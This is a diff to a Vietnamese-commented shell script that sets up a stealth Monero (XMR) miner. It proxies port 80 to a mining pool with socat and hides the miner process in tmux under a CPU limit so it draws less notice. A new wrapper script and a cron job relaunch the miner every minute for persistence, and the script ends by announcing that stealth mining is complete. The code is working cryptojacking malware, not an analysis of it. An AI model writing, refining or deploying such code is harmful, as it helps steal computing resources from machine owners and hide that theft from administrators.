@@ -53,14 +53,24 @@ cat > .cfg.json <<EOF
 EOF
 
 # ==== Tạo proxy từ port 80 sang pool TLS ====
-tmux has-session -t proxy 2>/dev/null || tmux new-session -d -s proxy "sudo socat TCP-LISTEN:80,reuseaddr,fork TCP:$POOL_REAL"
+tmux has-session -t proxy 2>/dev/null || \
+tmux new-session -d -s proxy "sudo socat TCP-LISTEN:80,reuseaddr,fork TCP:$POOL_REAL"
 
-# ==== Chạy tiến trình đào ngụy trang ====
+# ==== Tạo script khởi chạy ngụy trang với giới hạn CPU ====
+cat > "$INSTALL_DIR/run_miner.sh" <<EOF
+#!/bin/bash
+cd "$INSTALL_DIR"
+exec cpulimit -l $CPU_PERCENT -- ./$PROCESS_NAME -c .cfg.json
+EOF
+
+chmod +x "$INSTALL_DIR/run_miner.sh"
+
+# ==== Chạy tiến trình đào ngụy trang qua tmux ====
 tmux has-session -t "$SESSION_NAME" 2>/dev/null || \
-tmux new-session -d -s "$SESSION_NAME" "cd $INSTALL_DIR && cpulimit -l $CPU_PERCENT -- ./$PROCESS_NAME -c .cfg.json" 2>> "$INSTALL_DIR/error.log"
+tmux new-session -d -s "$SESSION_NAME" "$INSTALL_DIR/run_miner.sh"
 
 # ==== Tạo cron job để tự khôi phục ====
-(crontab -l 2>/dev/null; echo "* * * * * pgrep -f $PROCESS_NAME > /dev/null || (cd $INSTALL_DIR && tmux new-session -d -s $SESSION_NAME 'cpulimit -l $CPU_PERCENT -- ./$PROCESS_NAME -c .cfg.json')") | crontab -
+(crontab -l 2>/dev/null; echo "* * * * * pgrep -f $PROCESS_NAME > /dev/null || (cd $INSTALL_DIR && tmux new-session -d -s $SESSION_NAME '$INSTALL_DIR/run_miner.sh')") | crontab -
 
 # ==== Hoàn tất ====
 echo "✅ Đào XMR stealth hoàn tất"
